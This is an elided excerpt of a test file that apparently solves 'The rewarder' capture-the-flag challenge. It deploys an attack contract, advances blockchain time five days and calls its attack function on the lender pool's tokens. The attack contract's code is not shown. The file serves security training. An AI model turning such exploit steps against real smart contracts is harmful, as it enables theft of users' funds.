...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackRewardContract = await AttackRewardFactory
        .deploy(
        ...
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // five days

        await AttackRewardContract.attack(TOKENS_IN_LENDER_POOL);
    });
